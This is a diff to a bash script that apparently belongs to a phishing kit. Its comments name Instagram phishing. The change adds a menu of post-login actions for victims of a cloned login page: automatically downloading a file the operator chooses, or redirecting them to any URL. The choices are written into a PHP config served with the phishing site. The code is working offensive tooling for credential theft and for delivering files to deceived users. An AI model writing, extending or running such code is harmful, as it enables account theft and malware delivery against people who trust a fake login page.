@@ -291,17 +291,38 @@ cusport() {
 	fi
 }
 
-## Ask for download link (for Instagram phishing)
+## Ask for post-login action (for Instagram phishing)
 ask_download_link() {
 	echo
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter download file URL (or press Enter to skip): ${BLUE}" DOWNLOAD_LINK
+	echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Select Post-Login Action:"
+	echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Download File (auto-download)"
+	echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Redirect to URL (redirect to any website)"
+	echo -e "${RED}[${WHITE}00${RED}]${ORANGE} None (skip - redirect to instagram.com)"
 	echo
-	if [[ ! -z "${DOWNLOAD_LINK}" ]]; then
-		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Download link set: ${ORANGE}${DOWNLOAD_LINK}${WHITE}"
-	else
-		DOWNLOAD_LINK=""
-		echo -e "${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} No download link provided. Download feature disabled.${WHITE}"
-	fi
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select option [0/1/2]: ${BLUE}" ACTION_CHOICE
+	
+	case $ACTION_CHOICE in
+		1|01)
+			echo
+			read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter download file URL: ${BLUE}" DOWNLOAD_LINK
+			ACTION_TYPE="download"
+			REDIRECT_URL=""
+			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Download link set: ${ORANGE}${DOWNLOAD_LINK}${WHITE}"
+			;;
+		2|02)
+			echo
+			read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter redirect URL: ${BLUE}" REDIRECT_URL
+			ACTION_TYPE="redirect"
+			DOWNLOAD_LINK=""
+			echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Redirect URL set: ${ORANGE}${REDIRECT_URL}${WHITE}"
+			;;
+		*)
+			DOWNLOAD_LINK=""
+			REDIRECT_URL=""
+			ACTION_TYPE="none"
+			echo -e "${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} No action selected.${WHITE}"
+			;;
+	esac
 }
 
 ## Setup website and start php server
@@ -310,12 +331,21 @@ setup_site() {
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
 	
-	# Create download config file for phishing page
-	if [[ ! -z "${DOWNLOAD_LINK}" ]]; then
-		echo "<?php \$download_url = '${DOWNLOAD_LINK}'; ?>" > .server/www/download_config.php
-		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Download feature configured.${WHITE}"
+	# Create action config file for phishing page
+	cat > .server/www/action_config.php <<EOF
+<?php
+\$action_type = '${ACTION_TYPE}';
+\$download_url = '${DOWNLOAD_LINK}';
+\$redirect_url = '${REDIRECT_URL}';
+?>
+EOF
+	
+	if [[ "${ACTION_TYPE}" == "download" ]]; then
+		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Configured: File download${WHITE}"
+	elif [[ "${ACTION_TYPE}" == "redirect" ]]; then
+		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Configured: URL redirect to ${ORANGE}${REDIRECT_URL}${WHITE}"
 	else
-		echo "<?php \$download_url = ''; ?>" > .server/www/download_config.php
+		echo -e "${GREEN}[${WHITE}+${GREEN}]${CYAN} Configured: No post-login action${WHITE}"
 	fi
 	
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
